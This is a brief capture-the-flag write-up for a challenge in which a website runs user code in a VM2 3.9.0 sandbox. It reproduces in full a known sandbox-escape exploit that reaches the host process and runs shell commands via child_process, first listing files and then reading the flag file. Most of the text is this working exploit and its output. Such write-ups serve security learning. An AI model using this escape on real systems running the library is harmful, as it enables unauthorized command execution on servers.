# Pjescanik (170 points)

We are presented with a website which has a VM2 sandbox for running code and the information that it's version 3.9.0.

We also have the server source code and `package-lock.json`, but we don't really need them because they didn't lie and it's in fact using VM2 3.9.0, but we can double check if we really want to.

Searching the web for `VM2 3.9.0 exploit` we can immediately find [this](https://gist.github.com/leesh3288/f05730165799bf56d70391f3d9ea187c) and we get the exploit..

```js
aVM2_INTERNAL_TMPNAME = {};
function stack() {
    new Error().stack;
    stack();
}
try {
    stack();
} catch (a$tmpname) {
    a$tmpname.constructor.constructor('return process')().mainModule.require('child_process').execSync('ls');
}
```

This literally spits out the answer 

```text
Rezultat pokretanja koda:
node_modules package-lock.json package.json s3cr3tf01d3r server.js views
```

Then running `ls s3cr3tf01d3r` we see that it has the flag, and finally

```js
aVM2_INTERNAL_TMPNAME = {};
function stack() {
    new Error().stack;
    stack();
}
try {
    stack();
} catch (a$tmpname) {
    a$tmpname.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat s3cr3tf01d3r/f14g_048x6z43y7.txt');
}
```

Which gives the flag `CTF2024[293455399515]`.
